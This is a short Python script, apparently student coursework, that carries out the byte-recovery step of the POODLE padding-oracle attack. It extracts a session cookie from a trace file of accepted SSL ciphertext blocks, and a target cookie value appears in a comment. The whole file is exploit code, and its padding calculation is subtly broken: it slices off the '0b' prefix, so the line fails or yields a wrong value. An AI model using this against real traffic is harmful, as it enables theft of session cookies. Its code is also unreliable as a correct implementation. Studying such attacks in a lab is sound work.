#Poodle attack by Simen Andersen
#Email: SimAnd48374@stud.noroff.no

#target cookie: 3fe269ff4b43d5d870d38dc98e49fa22

from textwrap import wrap
import sys

file = sys.argv[1]

def read_file(file):
    accepted_lines = []
    with open(file, "r") as f:
        for line in f:
            line = line.split(",")
            if len(line) > 1:
                line[1] = line[1].rstrip()
                if (line[1] == "ACCEPTED"):
                    accepted_lines.append(line[0])
            elif len(line) == 1:
                line[0] = line[0].rstrip()
                accepted_lines.append(line)
        f.close()

    return accepted_lines


def calculate_cookie(c_rminone, block):
    block = block.split(" ")
    c_nminone = len(block) - 1

    block_c_rminone = wrap(block[c_rminone - 1], 2) #-1 to account for indexing starts with one
    block_c_nminone = wrap(block[c_nminone - 1], 2)
    
    hex_cr = int(block_c_rminone[15], 16)
    hex_cn = int(block_c_nminone[15], 16)
    hex_padding = int("0f", 16)

    bin_cr = int(bin(hex_cr)[2:], 2)
    bin_cn = int(bin(hex_cn)[2:], 2)
    padding = int(bin(hex_padding)[:2], 2)
    print(padding)
    mr = (padding ^ bin_cr ^ bin_cn)
    return chr(mr)

    
    


def main():
    traces = read_file(file)
    cookie = ""
    
    ssl_size = traces[0]
    c_r = traces[1]
    
    c_rminone = int(c_r[0]) - 1

    traces.pop(0)
    traces.pop(0) #remove the size and the c_r from the trace file to leave only the blocks.

    for block in traces:
        cookie += calculate_cookie(c_rminone, block)


    print(cookie, len(cookie))



if __name__ == "__main__":
    main()
